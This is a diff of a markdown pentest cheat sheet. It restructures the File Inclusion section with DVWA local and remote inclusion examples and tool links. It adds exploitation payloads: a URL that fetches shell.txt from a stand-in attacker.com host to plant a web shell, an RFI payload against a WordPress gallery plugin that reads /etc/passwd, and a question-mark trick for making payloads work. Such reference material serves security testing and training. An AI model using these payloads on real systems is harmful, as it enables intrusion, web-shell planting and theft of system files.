@@ -26,15 +26,28 @@ Command Injection
 
 
 File Inclusion
+==============
+
+Local File Inclusion
 --------------------
 
-Local: `http://localhost/dvwa/vulnerabilities/fi/?page=include.php`  
-Remote: `http://localhost/dvwa/vulnerabilities/fi/?page=http://google.com/robots.txt`  
-* `http://victim.com/i_dont_exist.php?code=<?php file_put_contents("shell.php", file_get_contents("http://attacker.com/shell.txt")) ?>`
-* `www.vuln.com/vuln/vuln.php?vuln=http://evil.com/vuln.php` where evil vuln.php contains `<?php print system("cat /etc/passwd"); ?>`
+Example: `http://localhost/dvwa/vulnerabilities/fi/?page=include.php`  
 
+Remote File Inclusion
+---------------------
+
+Example: `http://localhost/dvwa/vulnerabilities/fi/?page=http://google.com/robots.txt`  
 * [PHP File Inclusion Overview](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)  
 * [Uniscan](https://sourceforge.net/projects/uniscan/) - simple RFI, LFI and RCE vulnerability scanner  
+* [rfishell](https://github.com/superkojiman/rfishell) - provide a shell-like interface when exploiting RFI vulns  
+
+Exploitation examples:  
+```
+http://victim.com/i_dont_exist.php?code=<?php file_put_contents("shell.php", file_get_contents("http://attacker.com/shell.txt")) ?>
+http://10.0.17.147/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=http://10.0.17.145/test/test.txt? //test.txt contains <?php print system("cat /etc/passwd"); ?>
+```
+When appending questionmark to the end of the payload, the remainder of the local PHP code is treated as a parameter to the RFI included code. Also try multiple questionmarks.
+
 
 File Upload
 -----------
